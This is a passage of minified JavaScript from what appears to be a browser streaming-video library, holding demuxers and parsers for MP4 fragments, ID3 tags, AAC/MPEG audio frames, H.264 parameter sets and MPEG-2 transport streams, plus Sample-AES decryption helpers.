h=da(G,["mdia","mdhd"])[0];if(h&&(h=Oa(h,w=0===(w=h.data[h.start])?12:20),w=da(G,["mdia","hdlr"])[0])&&(w=String.fromCharCode.apply(null,w.data.subarray(w.start+8,w.start+12)),w={soun:x.a.AUDIO,vide:x.a.VIDEO}[w])){var F=void 0;(G=da(G,["mdia","minf","stbl","stsd"])[0])&&(F=String.fromCharCode.apply(null,G.data.subarray(G.start+12,G.start+16))),D[N]={timescale:h,type:w},D[w]={timescale:h,id:N,codec:F}}}}return da(E,["moov","mvex","trex"]).forEach((function(P){var O=Oa(P,4);(O=D[O])&&(O.default={duration:Oa(P,12),flags:Oa(P,20)})})),D}function m(E,D){return da(D,["moof","traf"]).reduce((function(I,L){var G=da(L,["tfdt"])[0],N=G.data[G.start];return null!==(L=da(L,["tfhd"]).reduce((function(w,h){if(h=Oa(h,4),h=E[h]){var F=Oa(G,4);if(1===N&&(F*=Math.pow(2,32),F+=Oa(G,8)),h=F/(h.timescale||9e4),isFinite(h)&&(null===w||h<w))return h}return w}),null))&&isFinite(L)&&(null===I||L<I)?L:I}),null)||0}function p(E,D){for(var I=0,L=0,G=0,N=da(E,["moof","traf"]),w=0;w<N.length;w++){var h=da(I=N[w],["tfhd"])[0],F=D[Oa(h,4)];if(F){var P=F.default,O=Oa(h,0)|(null==P?NaN:P.flags);P=null==P?void 0:P.duration,8&O&&(P=Oa(h,2&O?12:8)),h=F.timescale||9e4,O=da(I,["trun"]);for(var R=0;R<O.length;R++)I=P?P*Oa(O[R],4):l(O[R]),F.type===x.a.VIDEO?L+=I/h:F.type===x.a.AUDIO&&(G+=I/h)}}return 0===L&&0===G&&null!=(E=M(E))&&E.references?E.references.reduce((function(Q,ja){return Q+ja.info.duration||0}),0):L||G}function l(E){var D=Oa(E,0),I=8;1&D&&(I+=4),4&D&&(I+=4);for(var L=0,G=Oa(E,4),N=0;N<G;N++)256&D&&(L+=Oa(E,I),I+=4),512&D&&(I+=4),1024&D&&(I+=4),2048&D&&(I+=4);return L}function f(E,D,I){da(D,["moof","traf"]).forEach((function(L){da(L,["tfhd"]).forEach((function(G){if(G=Oa(G,4),G=E[G]){var N=G.timescale||9e4;da(L,["tfdt"]).forEach((function(w){var h=w.data[w.start],F=Oa(w,4);0===h?u(w,4,0>F-I*N?0:F-I*N):(F*=Math.pow(2,32),F+=Oa(w,8),F-=I*N,F=Math.max(F,0),h=Math.floor(F%(z+1)),u(w,4,Math.floor(F/(z+1))),u(w,8,h))}))}}))}))}function g(E){var D={valid:null,remainder:null},I=da(E,["moof"]);return I?2>I.length?(D.remainder=E,D):(I=I[I.length-1],D.valid=Object(r.a)(E,0,I.start-8),D.remainder=Object(r.a)(E,I.start-8),D):D}function t(E,D){var I=new Uint8Array(E.length+D.length);return I.set(E),I.set(D,E.length),I}Na.d(Va,"b",(function(){return da})),Na.d(Va,"g",(function(){return M})),Na.d(Va,"f",(function(){return v})),Na.d(Va,"d",(function(){return m})),Na.d(Va,"c",(function(){return p})),Na.d(Va,"e",(function(){return f})),Na.d(Va,"h",(function(){return g})),Na.d(Va,"a",(function(){return t}));var r=Na(8),x=Na(4),z=Math.pow(2,32)-1,J=[].push},function(wa,Va,Na){Na.d(Va,"b",(function(){return M})),Na.d(Va,"a",(function(){return m})),Na.d(Va,"d",(function(){return p})),Na.d(Va,"e",(function(){return l})),Na.d(Va,"c",(function(){return f})),Na.d(Va,"f",(function(){return g}));var Oa,u=function(t,r){return r+10<=t.length&&73===t[r]&&68===t[r+1]&&51===t[r+2]&&255>t[r+3]&&255>t[r+4]&&128>t[r+6]&&128>t[r+7]&&128>t[r+8]&&128>t[r+9]},da=function(t,r){return r+10<=t.length&&51===t[r]&&68===t[r+1]&&73===t[r+2]&&255>t[r+3]&&255>t[r+4]&&128>t[r+6]&&128>t[r+7]&&128>t[r+8]&&128>t[r+9]},M=function(t,r){for(var x=r,z=0;u(t,r);)z+=10,z+=v(t,r+6),da(t,r+10)&&(z+=10),r+=z;if(0<z)return t.subarray(x,x+z)},v=function(t,r){var x=0;return x=(127&t[r])<<21,x|=(127&t[r+1])<<14,(x|=(127&t[r+2])<<7)|127&t[r+3]},m=function(t,r){return u(t,r)&&v(t,r+6)+10<=t.length-r},p=function(t){t=f(t);for(var r=0;r<t.length;r++){var x=t[r];if(l(x))return 8===x.data.byteLength?(t=1&(r=new Uint8Array(x.data))[3],r=(r[4]<<23)+(r[5]<<15)+(r[6]<<7)+r[7],r/=45,t&&(r+=47721858.84),t=Math.round(r)):t=void 0,t}},l=function(t){return t&&"PRIV"===t.key&&"com.apple.streaming.transportStreamTimestamp"===t.info},f=function(t){for(var r=0,x=[];u(t,r);){var z=v(t,r+6);for(z=(r+=10)+z;r+8<z;){var J=t.subarray(r),E=String.fromCharCode(J[0],J[1],J[2],J[3]),D=v(J,4);if("PRIV"===(E=J={type:E,size:D,data:J.subarray(10,10+D)}).type)if(2>E.size)E=void 0;else{D=g(E.data,!0);var I=new Uint8Array(E.data.subarray(D.length+1));E={key:E.type,info:D,data:I.buffer}}else"W"===E.type[0]?"WXXX"===E.type?2>E.size?E=void 0:(I=1,I+=(D=g(E.data.subarray(I),!0)).length+1,I=g(E.data.subarray(I)),E={key:E.type,info:D,data:I}):(D=g(E.data),E={key:E.type,data:D}):2>E.size?E=void 0:"TXXX"===E.type?(I=1,I+=(D=g(E.data.subarray(I),!0)).length+1,I=g(E.data.subarray(I)),E={key:E.type,info:D,data:I}):(D=g(E.data.subarray(1)),E={key:E.type,data:D});E&&x.push(E),r+=J.size+10}da(t,r)&&(r+=10)}return x},g=function(t,r){void 0===r&&(r=!1);var x=(Oa||void 0===self.TextDecoder||(Oa=new self.TextDecoder("utf-8")),Oa);if(x)return t=x.decode(t),r?-1!==(r=t.indexOf("\0"))?t.substring(0,r):t:t.replace(/\0/g,"");for(var z,J,E=t.length,D="",I=0;I<E&&(0!==(x=t[I++])||!r);)if(0!==x&&3!==x)switch(x>>4){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:D+=String.fromCharCode(x);break;case 12:case 13:z=t[I++],D+=String.fromCharCode((31&x)<<6|63&z);break;case 14:z=t[I++],J=t[I++],D+=String.fromCharCode((15&x)<<12|(63&z)<<6|63&J)}return D}},function(wa,Va,Na){function Oa(v,m,p,l){return void 0===p&&(p=1),void 0===l&&(l=!1),v=v*m*p,l?Math.round(v):v}function u(v,m,p,l){return void 0===p&&(p=1),void 0===l&&(l=!1),Oa(v,m,1/p,l)}function da(v,m){return void 0===m&&(m=!1),Oa(v,1e3,1/9e4,m)}function M(v,m){return void 0===m&&(m=1),Oa(v,9e4,1/m)}Na.d(Va,"c",(function(){return u})),Na.d(Va,"b",(function(){return da})),Na.d(Va,"a",(function(){return M}))},function(wa,Va,Na){function Oa(u,da,M){return Uint8Array.prototype.slice?u.slice(da,M):new Uint8Array(Array.prototype.slice.call(u,da,M))}Na.d(Va,"a",(function(){return Oa}))},function(wa,Va,Na){function Oa(ha,ka){return 255===ha[ka]&&240==(246&ha[ka+1])}function u(ha,ka){return(3&ha[ka+3])<<11|ha[ka+4]<<3|(224&ha[ka+5])>>>5}function da(ha,ka){if(ka+1<ha.length&&Oa(ha,ka)){var la=1&ha[ka+1]?7:9;if(ka+la>=ha.length)return!1;var C=u(ha,ka);return!(C<=la)&&((ka+=C)===ha.length||ka+1<ha.length&&Oa(ha,ka))}return!1}function M(ha,ka,la,C,fa){if(!ha.samplerate){var qa,va,xa,za=navigator.userAgent.toLowerCase(),Ca=[96e3,88200,64e3,48e3,44100,32e3,24e3,22050,16e3,12e3,11025,8e3,7350],Ba=1+((192&la[C+2])>>>6),Ga=(60&la[C+2])>>>2;Ga>Ca.length-1?(ka.trigger(I.a.ERROR,{type:L.b.MEDIA_ERROR,details:L.a.FRAG_PARSING_ERROR,fatal:!0,reason:"invalid ADTS sampling index:"+Ga}),ka=void 0):(va=(1&la[C+2])<<2,va|=(192&la[C+3])>>>6,O.b.log("manifest codec:"+fa+", ADTS type:"+Ba+", samplingIndex:"+Ga),/firefox/i.test(za)?6<=Ga?(Ba=5,xa=Array(4),qa=Ga-3):(Ba=2,xa=Array(2),qa=Ga):-1!==za.indexOf("android")?(Ba=2,xa=Array(2),qa=Ga):(Ba=5,xa=Array(4),fa&&(-1!==fa.indexOf("mp4a.40.29")||-1!==fa.indexOf("mp4a.40.5"))||!fa&&6<=Ga?qa=Ga-3:((fa&&-1!==fa.indexOf("mp4a.40.2")&&(6<=Ga&&1===va||/vivaldi/i.test(za))||!fa&&1===va)&&(Ba=2,xa=Array(2)),qa=Ga)),xa[0]=Ba<<3,xa[0]|=(14&Ga)>>1,xa[1]|=(1&Ga)<<7,xa[1]|=va<<3,5===Ba&&(xa[1]|=(14&qa)>>1,xa[2]=(1&qa)<<7,xa[2]|=8,xa[3]=0),ka={config:xa,samplerate:Ca[Ga],channelCount:va,codec:"mp4a.40."+Ba,manifestCodec:fa}),ka&&(ha.config=ka.config,ha.samplerate=ka.samplerate,ha.channelCount=ka.channelCount,ha.codec=ka.codec,ha.manifestCodec=ka.manifestCodec,O.b.log("parsed codec:"+ha.codec+", rate:"+ka.samplerate+", channels:"+ka.channelCount))}}function v(ha,ka,la,C,fa){var qa=9216e4/ha.samplerate,va=ka.length,xa=1&ka[la+1]?7:9,za=u(ka,la);if(C=0<(za-=xa)&&la+xa+za<=va?{headerLength:xa,frameLength:za,stamp:C+fa*qa}:void 0)return fa=C.stamp,za=C.headerLength,C=C.frameLength,ka={unit:ka.subarray(la+za,la+za+C),pts:fa,dts:fa},ha.samples.push(ka),{sample:ka,length:C+za}}function m(ha,ka){return(m=Object.setPrototypeOf||function(la,C){return la.__proto__=C,la})(ha,ka)}function p(ha,ka,la,C,fa){if(!(la+24>ka.length)){var qa=l(ka,la);if(qa&&la+qa.frameLength<=ka.length)return C+=9e4*qa.samplesPerFrame/qa.sampleRate*fa,ka={unit:ka.subarray(la,la+qa.frameLength),pts:C,dts:C},ha.config=[],ha.channelCount=qa.channelCount,ha.samplerate=qa.sampleRate,ha.samples.push(ka),{sample:ka,length:qa.frameLength}}}function l(ha,ka){var la=ha[ka+1]>>3&3,C=ha[ka+1]>>1&3,fa=ha[ka+2]>>4&15,qa=ha[ka+2]>>2&3;if(1!==la&&0!==fa&&15!==fa&&3!==qa){var va=ha[ka+3]>>6;fa=1e3*ja[14*(3===la?3-C:3===C?3:4)+fa-1],qa=W[3*(3===la?0:2===la?1:2)+qa];var xa=3===va?1:2,za=aa[la][C],Ca=ma[C];return la=8*za*Ca,za=Math.floor(za*fa/qa+(ha[ka+2]>>1&1))*Ca,null===Q&&(Q=(Ca=(navigator.userAgent||"").match(/Chrome\/(\d+)/i))?parseInt(Ca[1]):0),!!Q&&87>=Q&&2===C&&224e3<=fa&&0===va&&(ha[ka+3]|=128),{sampleRate:qa,channelCount:xa,frameLength:za,samplesPerFrame:la}}}function f(ha,ka){return!(255!==ha[ka]||224&~ha[ka+1]||!(6&ha[ka+1]))}function g(ha,ka,la,C){return{key:ha,frame:!1,pts:ka,dts:la,units:[],debug:C,length:0}}function t(ha){var ka,la,C,fa,qa=0,va=ha.data;if(!ha||0===ha.size)return null;for(;19>va[0].length&&1<va.length;){var xa=new Uint8Array(va[0].length+va[1].length);xa.set(va[0]),xa.set(va[1],va[0].length),va[0]=xa,va.splice(1,1)}if(1===((ka=va[0])[0]<<16)+(ka[1]<<8)+ka[2]){if((la=(ka[4]<<8)+ka[5])&&la>ha.size-6)return null;192&(xa=ka[7])&&(C=536870912*(14&ka[9])+4194304*(255&ka[10])+16384*(254&ka[11])+128*(255&ka[12])+(254&ka[13])/2,64&xa?54e5<C-(fa=536870912*(14&ka[14])+4194304*(255&ka[15])+16384*(254&ka[16])+128*(255&ka[17])+(254&ka[18])/2)&&(O.b.warn(Math.round((C-fa)/9e4)+"s delta between PTS and DTS, align them"),C=fa):fa=C);var za=(xa=ka[8])+9;if(ha.size<=za)return null;ha.size-=za,ha=new Uint8Array(ha.size);for(var Ca=0,Ba=va.length;Ca<Ba;Ca++){var Ga=(ka=va[Ca]).byteLength;if(za){if(za>Ga){za-=Ga;continue}ka=ka.subarray(za),Ga-=za,za=0}ha.set(ka,qa),qa+=Ga}return la&&(la-=xa+3),{data:ha,pts:C,dts:fa,len:la}}return null}function r(ha,ka){if(ha.units.length&&ha.frame){if(void 0===ha.pts){var la=ka.samples,C=la.length;if(!C)return void ka.dropped++;la=la[C-1],ha.pts=la.pts,ha.dts=la.dts}ka.samples.push(ha)}ha.debug.length&&O.b.log(ha.pts+"/"+ha.dts+":"+ha.debug)}function x(ha,ka){var la=ha.length;if(0<la){if(ka.pts>=ha[la-1].pts)ha.push(ka);else for(--la;0<=la;la--)if(ka.pts<ha[la].pts){ha.splice(la,0,ka);break}}else ha.push(ka)}function z(ha){for(var ka=ha.byteLength,la=[],C=1;C<ka-2;)0===ha[C]&&0===ha[C+1]&&3===ha[C+2]?(la.push(C+2),C+=2):C++;if(0===la.length)return ha;ka-=la.length;var fa=new Uint8Array(ka),qa=0;for(C=0;C<ka;qa++,C++)qa===la[0]&&(qa++,la.shift()),fa[C]=ha[qa];return fa}function J(ha,ka){return(J=Object.setPrototypeOf||function(la,C){return la.__proto__=C,la})(ha,ka)}function E(ha,ka){return(ha=null==ha?void 0:ha.codec)&&4<ha.length?ha:"hvc1"===ha?"hvc1.1.c.L120.90":"av01"===ha?"av01.0.04M.08":"avc1"===ha||ka===Z.a.VIDEO?"avc1.42e01e":"mp4a.40.5"}function D(ha){return"then"in ha&&ha.then instanceof Function}Na.d(Va,"c",(function(){return V})),Na.d(Va,"d",(function(){return D})),Na.d(Va,"a",(function(){return oa})),Na.d(Va,"b",(function(){return ba}));var I=Na(0),L=Na(2),G=Na(14),N=Na(3),w=Na(6),h=Na(5),F=Na(8),P=function(){function ha(){this._id3Track=this._audioTrack=void 0,this.frameIndex=0,this.initPTS=this.cachedData=null}var ka=ha.prototype;return ka.resetInitSegment=function(la,C,fa){this._id3Track={type:"id3",id:0,pid:-1,inputTimeScale:9e4,sequenceNumber:0,samples:[],dropped:0}},ka.resetTimeStamp=function(){},ka.resetContiguity=function(){},ka.canParse=function(la,C){return!1},ka.appendFrame=function(la,C,fa){},ka.demux=function(la,C){this.cachedData&&(la=Object(h.a)(this.cachedData,la),this.cachedData=null);var fa,qa=w.b(la,0),va=qa?qa.length:0,xa=this._audioTrack,za=this._id3Track,Ca=qa?w.d(qa):void 0,Ba=la.length;for(0!==this.frameIndex&&null!==this.initPTS||(this.initPTS=Object(N.a)(Ca)?90*Ca:9e4*C),qa&&0<qa.length&&za.samples.push({pts:this.initPTS,dts:this.initPTS,data:qa}),C=this.initPTS;va<Ba;)this.canParse(la,va)?(Ca=this.appendFrame(xa,la,va))?(this.frameIndex++,C=Ca.sample.pts,fa=va+=Ca.length):va=Ba:w.a(la,va)?(qa=w.b(la,va),za.samples.push({pts:C,dts:C,data:qa}),fa=va+=qa.length):va++,va===Ba&&fa!==Ba&&(Ca=Object(F.a)(la,fa),this.cachedData?this.cachedData=Object(h.a)(this.cachedData,Ca):this.cachedData=Ca);return{audioTrack:xa,avcTrack:{type:"",id:-1,pid:-1,inputTimeScale:9e4,sequenceNumber:-1,samples:[],dropped:0},id3Track:za,textTrack:{type:"",id:-1,pid:-1,inputTimeScale:9e4,sequenceNumber:-1,samples:[],dropped:0}}},ka.demuxSampleAes=function(la,C,fa){return Promise.reject(Error("["+this+"] This demuxer does not support Sample-AES decryption"))},ka.flush=function(la){return(la=this.cachedData)&&(this.cachedData=null,this.demux(la,0)),this.frameIndex=0,{audioTrack:this._audioTrack,avcTrack:{type:"",id:-1,pid:-1,inputTimeScale:9e4,sequenceNumber:-1,samples:[],dropped:0},id3Track:this._id3Track,textTrack:{type:"",id:-1,pid:-1,inputTimeScale:9e4,sequenceNumber:-1,samples:[],dropped:0}}},ka.destroy=function(){},ha}(),O=Na(1);(wa=function(ha){function ka(C,fa){var qa;return(qa=ha.call(this)||this).observer=void 0,qa.observer=C,qa.config=fa,qa}ka.prototype=Object.create(ha.prototype),ka.prototype.constructor=ka,m(ka,ha);var la=ka.prototype;return la.resetInitSegment=function(C,fa,qa){ha.prototype.resetInitSegment.call(this,C,fa,qa),this._audioTrack={container:"audio/adts",type:"audio",id:0,pid:-1,sequenceNumber:0,isAAC:!0,samples:[],manifestCodec:C,duration:qa,inputTimeScale:9e4,dropped:0}},ka.probe=function(C){if(!C)return!1;for(var fa=(w.b(C,0)||[]).length,qa=C.length;fa<qa;fa++)if(da(C,fa))return O.b.log("ADTS sync word found !"),!0;return!1},la.canParse=function(C,fa){return fa+5<C.length&&Oa(C,fa)&&u(C,fa)<=C.length-fa},la.appendFrame=function(C,fa,qa){return M(C,this.observer,fa,qa,C.manifestCodec),v(C,fa,qa,this.initPTS,this.frameIndex)},ka}(P)).minProbeByteLength=9;var R=function(){function ha(la,C){this.remainderData=null,this.config=C}var ka=ha.prototype;return ka.resetTimeStamp=function(){},ka.resetInitSegment=function(){},ka.resetContiguity=function(){},ha.probe=function(la){return 0<Object(h.b)({data:la,start:0,end:Math.min(la.length,16384)},["moof"]).length},ka.demux=function(la){var C=la,fa={type:"",id:-1,pid:-1,inputTimeScale:9e4,sequenceNumber:-1,samples:[],dropped:0};return this.config.progressive?(this.remainderData&&(C=Object(h.a)(this.remainderData,la)),la=Object(h.h)(C),this.remainderData=la.remainder,fa.samples=la.valid||new Uint8Array):fa.samples=C,{audioTrack:{type:"",id:-1,pid:-1,inputTimeScale:9e4,sequenceNumber:-1,samples:[],dropped:0},avcTrack:fa,id3Track:{type:"",id:-1,pid:-1,inputTimeScale:9e4,sequenceNumber:-1,samples:[],dropped:0},textTrack:{type:"",id:-1,pid:-1,inputTimeScale:9e4,sequenceNumber:-1,samples:[],dropped:0}}},ka.flush=function(){var la={type:"",id:-1,pid:-1,inputTimeScale:9e4,sequenceNumber:-1,samples:[],dropped:0};return la.samples=this.remainderData||new Uint8Array,this.remainderData=null,{audioTrack:{type:"",id:-1,pid:-1,inputTimeScale:9e4,sequenceNumber:-1,samples:[],dropped:0},avcTrack:la,id3Track:{type:"",id:-1,pid:-1,inputTimeScale:9e4,sequenceNumber:-1,samples:[],dropped:0},textTrack:{type:"",id:-1,pid:-1,inputTimeScale:9e4,sequenceNumber:-1,samples:[],dropped:0}}},ka.demuxSampleAes=function(la,C,fa){return Promise.reject(Error("The MP4 demuxer does not support SAMPLE-AES decryption"))},ka.destroy=function(){},ha}();R.minProbeByteLength=1024;var Q=null,ja=[32,64,96,128,160,192,224,256,288,320,352,384,416,448,32,48,56,64,80,96,112,128,160,192,224,256,320,384,32,40,48,56,64,80,96,112,128,160,192,224,256,320,32,48,56,64,80,96,112,128,144,160,176,192,224,256,8,16,24,32,40,48,56,64,80,96,112,128,144,160],W=[44100,48e3,32e3,22050,24e3,16e3,11025,12e3,8e3],aa=[[0,72,144,12],[0,0,0,0],[0,72,144,12],[0,144,144,12]],ma=[0,1,1,4],H=function(){function ha(la){this.bitsAvailable=this.word=this.bytesAvailable=this.data=void 0,this.data=la,this.bytesAvailable=la.byteLength,this.bitsAvailable=this.word=0}var ka=ha.prototype;return ka.loadWord=function(){var la=this.data,C=this.bytesAvailable,fa=la.byteLength-C,qa=new Uint8Array(4);if(0===(C=Math.min(4,C)))throw Error("no bytes available");qa.set(la.subarray(fa,fa+C)),this.word=new DataView(qa.buffer).getUint32(0),this.bitsAvailable=8*C,this.bytesAvailable-=C},ka.skipBits=function(la){var C;this.bitsAvailable>la?(this.word<<=la,this.bitsAvailable-=la):(la-=this.bitsAvailable,la-=(C=la>>3)>>3,this.bytesAvailable-=C,this.loadWord(),this.word<<=la,this.bitsAvailable-=la)},ka.readBits=function(la){var C=Math.min(this.bitsAvailable,la),fa=this.word>>>32-C;return 32<la&&O.b.error("Cannot read more than 32 bits at a time"),this.bitsAvailable-=C,0<this.bitsAvailable?this.word<<=C:0<this.bytesAvailable&&this.loadWord(),0<(C=la-C)&&this.bitsAvailable?fa<<C|this.readBits(C):fa},ka.skipLZ=function(){var la;for(la=0;la<this.bitsAvailable;++la)if(this.word&2147483648>>>la)return this.word<<=la,this.bitsAvailable-=la,la;return this.loadWord(),la+this.skipLZ()},ka.skipUEG=function(){this.skipBits(1+this.skipLZ())},ka.skipEG=function(){this.skipBits(1+this.skipLZ())},ka.readUEG=function(){var la=this.skipLZ();return this.readBits(la+1)-1},ka.readEG=function(){var la=this.readUEG();return 1&la?1+la>>>1:-1*(la>>>1)},ka.readBoolean=function(){return 1===this.readBits(1)},ka.readUByte=function(){return this.readBits(8)},ka.readUShort=function(){return this.readBits(16)},ka.readUInt=function(){return this.readBits(32)},ka.skipScalingList=function(la){for(var C=8,fa=8,qa=0;qa<la;qa++)0!==fa&&(fa=(C+this.readEG()+256)%256),C=0===fa?C:fa},ka.readSPS=function(){var la=0,C=0,fa=0,qa=0,va=this.readUByte.bind(this),xa=this.readBits.bind(this),za=this.readUEG.bind(this),Ca=this.readBoolean.bind(this),Ba=this.skipBits.bind(this),Ga=this.skipEG.bind(this),Ra=this.skipUEG.bind(this),La=this.skipScalingList.bind(this);va();var Ya=va();if(xa(5),Ba(3),va(),Ra(),(100===Ya||110===Ya||122===Ya||244===Ya||44===Ya||83===Ya||86===Ya||118===Ya||128===Ya)&&(3===(Ya=za())&&Ba(1),Ra(),Ra(),Ba(1),Ca())){var hb=3!==Ya?8:12;for(Ya=0;Ya<hb;Ya++)Ca()&&La(6>Ya?16:64)}if(Ra(),0===(La=za()))za();else if(1===La)for(Ba(1),Ga(),Ga(),La=za(),Ya=0;Ya<La;Ya++)Ga();if(Ra(),Ba(1),Ga=za(),Ra=za(),0===(xa=xa(1))&&Ba(1),Ba(1),Ca()&&(la=za(),C=za(),fa=za(),qa=za()),za=[1,1],Ca()&&Ca())switch(va()){case 1:za=[1,1];break;case 2:za=[12,11];break;case 3:za=[10,11];break;case 4:za=[16,11];break;case 5:za=[40,33];break;case 6:za=[24,11];break;case 7:za=[20,11];break;case 8:za=[32,11];break;case 9:za=[80,33];break;case 10:za=[18,11];break;case 11:za=[15,11];break;case 12:za=[64,33];break;case 13:za=[160,99];break;case 14:za=[4,3];break;case 15:za=[3,2];break;case 16:za=[2,1];break;case 255:za=[va()<<8|va(),va()<<8|va()]}return{width:Math.ceil(16*(Ga+1)-2*la-2*C),height:(2-xa)*(Ra+1)*16-(xa?2:4)*(fa+qa),pixelRatio:za}},ka.readSliceType=function(){return this.readUByte(),this.readUEG(),this.readUEG()},ha}(),B=function(){function ha(la,C,fa){this.decrypter=void 0,this.keyData=fa,this.decrypter=new G.a(la,C,{removePKCS7Padding:!1})}var ka=ha.prototype;return ka.decryptBuffer=function(la,C){this.decrypter.decrypt(la,this.keyData.key.buffer,this.keyData.iv.buffer,C)},ka.decryptAacSample=function(la,C,fa,qa){var va=la[C].unit,xa=va.subarray(16,va.length-va.length%16);xa=xa.buffer.slice(xa.byteOffset,xa.byteOffset+xa.length);var za=this;this.decryptBuffer(xa,(function(Ca){Ca=new Uint8Array(Ca),va.set(Ca,16),qa||za.decryptAacSamples(la,C+1,fa)}))},ka.decryptAacSamples=function(la,C,fa){for(;;C++){if(C>=la.length)return void fa();if(!(32>la[C].unit.length)){var qa=this.decrypter.isSync();if(this.decryptAacSample(la,C,fa,qa),!qa)break}}},ka.getAvcEncryptedData=function(la){for(var C=new Int8Array(16*Math.floor((la.length-48)/160)+16),fa=0,qa=32;qa<=la.length-16;qa+=160,fa+=16)C.set(la.subarray(qa,qa+16),fa);return C},ka.getAvcDecryptedUnit=function(la,C){C=new Uint8Array(C);for(var fa=0,qa=32;qa<=la.length-16;qa+=160,fa+=16)la.set(C.subarray(fa,fa+16),qa);return la},ka.decryptAvcSample=function(la,C,fa,qa,va,xa){var za=z(va.data),Ca=this.getAvcEncryptedData(za),Ba=this;this.decryptBuffer(Ca.buffer,(function(Ga){va.data=Ba.getAvcDecryptedUnit(za,Ga),xa||Ba.decryptAvcSamples(la,C,fa+1,qa)}))},ka.decryptAvcSamples=function(la,C,fa,qa){if(la instanceof Uint8Array)throw Error("Cannot decrypt samples of type Uint8Array");for(;;C++,fa=0){if(C>=la.length)return void qa();for(var va=la[C].units;!(fa>=va.length);fa++){var xa=va[fa];if(!(48>=xa.data.length||1!==xa.type&&5!==xa.type)){var za=this.decrypter.isSync();if(this.decryptAvcSample(la,C,fa,qa,xa,za),!za)return}}}},ha}(),A={video:1,audio:2,id3:3,text:4};(Va=function(){function ha(la,C,fa){this.sampleAes=null,this.pmtParsed=!1,this.videoCodec=this.audioCodec=void 0,this._duration=0,this._initDTS=this._initPTS=this.aacLastPTS=null,this._pmtId=-1,this._txtTrack=this._id3Track=this._audioTrack=this._avcTrack=void 0,this.remainderData=this.avcSample=this.aacOverFlow=null,this.observer=la,this.config=C,this.typeSupported=fa}ha.probe=function(la){return!(0>(la=ha.syncOffset(la))||(la&&O.b.warn("MPEG2-TS detected but first sync word found @ offset "+la+", junk ahead ?"),0))},ha.syncOffset=function(la){for(var C=Math.min(1e3,la.length-564),fa=0;fa<C;){if(71===la[fa]&&71===la[fa+188]&&71===la[fa+376])return fa;fa++}return-1},ha.createTrack=function(la,C){return{container:"video"===la||"audio"===la?"video/mp2t":void 0,type:la,id:A[la],pid:-1,inputTimeScale:9e4,sequenceNumber:0,samples:[],dropped:0,duration:"audio"===la?C:void 0}};var ka=ha.prototype;return ka.resetInitSegment=function(la,C,fa){this.pmtParsed=!1,this._pmtId=-1,this._avcTrack=ha.createTrack("video",fa),this._audioTrack=ha.createTrack("audio",fa),this._id3Track=ha.createTrack("id3",fa),this._txtTrack=ha.createTrack("text",fa),this._audioTrack.isAAC=!0,this.avcSample=this.aacLastPTS=this.aacOverFlow=null,this.audioCodec=la,this.videoCodec=C,this._duration=fa},ka.resetTimeStamp=function(){},ka.resetContiguity=function(){var la=this._audioTrack,C=this._avcTrack,fa=this._id3Track;la&&(la.pesData=null),C&&(C.pesData=null),fa&&(fa.pesData=null),this.aacLastPTS=this.aacOverFlow=null},ka.demux=function(la,C,fa,qa){var va;void 0===fa&&(fa=!1),void 0===qa&&(qa=!1),fa||(this.sampleAes=null),C=this._avcTrack;var xa=this._audioTrack,za=this._id3Track,Ca=C.pid,Ba=C.pesData,Ga=xa.pid,Ra=za.pid,La=xa.pesData,Ya=za.pesData,hb=!1,bb=this.pmtParsed,Da=this._pmtId,Pa=la.length;if(this.remainderData&&(Pa=(la=Object(h.a)(this.remainderData,la)).length,this.remainderData=null),188>Pa&&!qa)return this.remainderData=la,{audioTrack:xa,avcTrack:C,id3Track:za,textTrack:this._txtTrack};var eb=Math.max(0,ha.syncOffset(la));(Pa-=(Pa+eb)%188)<la.byteLength&&!qa&&(this.remainderData=new Uint8Array(la.buffer,Pa,la.buffer.byteLength-Pa));for(var Ta=eb;Ta<Pa;Ta+=188)if(71===la[Ta]){var mb,qb=!!(64&la[Ta+1]),ib=((31&la[Ta+1])<<8)+la[Ta+2];if(1<(48&la[Ta+3])>>4){if((mb=Ta+5+la[Ta+4])===Ta+188)continue}else mb=Ta+4;switch(ib){case Ca:qb&&(Ba&&(va=t(Ba))&&this.parseAVCPES(va,!1),Ba={data:[],size:0}),Ba&&(Ba.data.push(la.subarray(mb,Ta+188)),Ba.size+=Ta+188-mb);break;case Ga:qb&&(La&&(va=t(La))&&(xa.isAAC?this.parseAACPES(va):this.parseMPEGPES(va)),La={data:[],size:0}),La&&(La.data.push(la.subarray(mb,Ta+188)),La.size+=Ta+188-mb);break;case Ra:qb&&(Ya&&(va=t(Ya))&&this.parseID3PES(va),Ya={data:[],size:0}),Ya&&(Ya.data.push(la.subarray(mb,Ta+188)),Ya.size+=Ta+188-mb);break;case 0:qb&&(mb+=la[mb]+1),Da=this._pmtId=(31&la[mb+10])<<8|la[mb+11];break;case Da:qb&&(mb+=la[mb]+1),qb=la,ib=!0===this.typeSupported.mpeg||!0===this.typeSupported.mp3;var Db=fa,Ab={audio:-1,avc:-1,id3:-1,isAAC:!0},db=mb+3+((15&qb[mb+1])<<8|qb[mb+2])-4;for(mb+=12+((15&qb[mb+10])<<8|qb[mb+11]);mb<db;){var Za=(31&qb[mb+1])<<8|qb[mb+2];switch(qb[mb]){case 207:if(!Db){O.b.log("ADTS AAC with AES-128-CBC frame encryption found in unencrypted stream");break}case 15:-1===Ab.audio&&(Ab.audio=Za);break;case 21:-1===Ab.id3&&(Ab.id3=Za);break;case 219:if(!Db){O.b.log("H.264 with AES-128-CBC slice encryption found in unencrypted stream");break}case 27:-1===Ab.avc&&(Ab.avc=Za);break;case 3:case 4:ib?-1===Ab.audio&&(Ab.audio=Za,Ab.isAAC=!1):O.b.log("MPEG audio found, not supported in this browser");break;case 36:O.b.warn("Unsupported HEVC stream type found")}mb+=5+((15&qb[mb+3])<<8|qb[mb+4])}0<(Ca=(qb=Ab).avc)&&(C.pid=Ca),0<(Ga=qb.audio)&&(xa.pid=Ga,xa.isAAC=qb.isAAC),0<(Ra=qb.id3)&&(za.pid=Ra),hb&&!bb&&(O.b.log("reparse from beginning"),hb=!1,Ta=eb-188),bb=this.pmtParsed=!0;break;case 17:case 8191:break;default:hb=!0}}else this.observer.emit(I.a.ERROR,I.a.ERROR,{type:L.b.MEDIA_ERROR,details:L.a.FRAG_PARSING_ERROR,fatal:!1,reason:"TS packet did not start with 0x47"});return C.pesData=Ba,xa.pesData=La,za.pesData=Ya,la={audioTrack:xa,avcTrack:C,id3Track:za,textTrack:this._txtTrack},qa&&this.extractRemainingSamples(la),la},ka.flush=function(){var la,C=this.remainderData;return 